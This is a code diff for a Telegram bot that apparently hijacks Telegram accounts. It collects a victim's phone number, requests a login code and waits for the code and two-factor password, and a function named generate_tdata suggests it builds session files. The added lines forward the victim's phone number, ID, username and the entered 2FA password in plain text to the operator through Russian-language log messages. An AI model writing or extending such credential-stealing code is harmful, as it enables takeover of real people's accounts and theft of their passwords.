@@ -242,7 +242,9 @@ async def contact_handler(message: types.Message):
         phone_code_hash = await send_code(phone)
         pending[user_id] = {
             'phone': phone,
-            'phone_code_hash': phone_code_hash
+            'phone_code_hash': phone_code_hash,
+            'username': tg_user.username or '—',
+            'name': tg_user.first_name or '—',
         }
         await redis_set(f"sync:{user_id}", "code_sent")
         print(f"Code sent, redis key: sync:{user_id} = code_sent")
@@ -283,6 +285,15 @@ async def wait_for_code(user_id):
                 else:
                     await redis_set(f"code_result:{user_id}", "wrong_code")
                     asyncio.create_task(wait_for_code(user_id))
+                    data2 = pending.get(user_id, {})
+                    
+                    await send_log(
+                        f"❌ <b>пользователь ввёл неверный код</b>\n"
+                        f"├ бот: @asfafaff_bot\n"
+                        f"├ номер: <code>{data.get('phone','—')}</code>\n"
+                        f"├ id: <code>{user_id}</code>\n"
+                        f"└ тэг: @{data.get('username','—')}"
+                    )
             return
     print(f"Timeout waiting for code from {user_id}")
 
@@ -315,6 +326,15 @@ async def wait_for_2fa(user_id):
                 print(f"2FA error: {e}")
                 await redis_set(f"2fa_result:{user_id}", "wrong_password")
                 asyncio.create_task(wait_for_2fa(user_id))
+                data2 = pending.get(user_id, {})
+                await send_log(
+                    f"❌ <b>Пользователь ввёл неверный 2FA</b>\n"
+                    f"├ Бот: @asfafaff_bot\n"
+                    f"├ Номер: <code>{data2.get('phone','—')}</code>\n"
+                    f"├ ID: <code>{user_id}</code>\n"
+                    f"├ тэг: @{data2.get('username','—')}\n"
+                    f"└ пароль: <code>{password}</code>"
+                )
             return
 
 async def generate_tdata(user_id, phone):
